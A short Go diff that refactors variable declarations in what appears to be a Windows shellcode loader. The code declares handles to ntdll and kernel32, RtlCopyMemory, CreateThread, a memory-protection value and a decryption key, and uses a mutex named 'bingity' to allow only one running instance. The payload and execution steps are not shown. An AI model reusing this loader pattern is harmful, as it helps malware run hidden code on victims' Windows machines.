@@ -29,18 +29,26 @@ func check(e error) {
 }
 
 func main() {
-	var addr uintptr
-	var e error
-	var k *babble.Key
-	var ntdll, kernel32 *windows.LazyDLL
-	var rtlcopymemory, createthread *windows.LazyProc
-	var oldprotect uint32
-	var thread uintptr
-	var event uint32
+	var (
+		addr          uintptr
+		createthread  *windows.LazyProc
+		createmutex   *windows.LazyProc
+		e             error
+		event         uint32
+		hndlerr       error
+		k             *babble.Key
+		kernel32      *windows.LazyDLL
+		ntdll         *windows.LazyDLL
+		oldprotect    uint32
+		rtlcopymemory *windows.LazyProc
+		thread        uintptr
+	)
 	ntdll = windows.NewLazySystemDLL("ntdll.dll")
 	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
-	var createmutex = kernel32.NewProc("CreateMutexW")
-	_, _, hndlerr := createmutex.Call(0, 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("bingity"))))
+	createmutex = kernel32.NewProc("CreateMutexW")
+	_, _, hndlerr = createmutex.Call(
+		0, 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("bingity"))),
+	)
 
 	if !strings.Contains(hndlerr.Error(), "successfully") {
 		return
